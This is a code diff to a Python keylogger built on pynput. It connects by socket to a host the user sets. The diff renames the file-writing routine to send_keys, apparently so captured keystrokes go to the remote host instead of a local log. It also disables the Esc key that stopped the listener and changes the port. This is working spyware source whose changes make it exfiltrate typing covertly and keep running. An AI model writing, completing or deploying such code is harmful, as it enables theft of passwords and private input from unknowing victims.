@@ -1,3 +1,4 @@
+# installs pynput
 from subprocess import check_output
 check_output("pip3 install pynput")
 import socket
@@ -13,11 +14,9 @@ from pynput.keyboard import Key, Listener
 # add your hostname
 host = ''
 ip = socket.gethostbyname(host)
-port = 31337
+port = 13616
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip, port))
-# test statement to see if connection is made
-# print(s.recv(1024).decode())
 
 count = 0
 keys = []
@@ -37,17 +36,16 @@ def on_press(key):
         keys.pop()
         count -= 2
 
-    # log every 10 key presses
+    # log every 10 key presses AFTER a space is pressed (keeps logs readable)
     if count >= 10 and key == Key.space:
         count = 0
-        write_file(keys)
+        send_keys(keys)
         keys = []
 
 
-def write_file(keys):
-    # append to or create log file this is the functional log
+def send_keys(logged_keys):
     temp = ""
-    for key in keys:
+    for key in logged_keys:
         if key == Key.space:
             # newline if space
             temp += "\n"
@@ -65,8 +63,9 @@ def write_file(keys):
 
 
 def on_release(key):
+    # stop listener (only for testing)
     if key == pynput.keyboard.Key.esc:
-        return False
+        pass
     pass
 
 
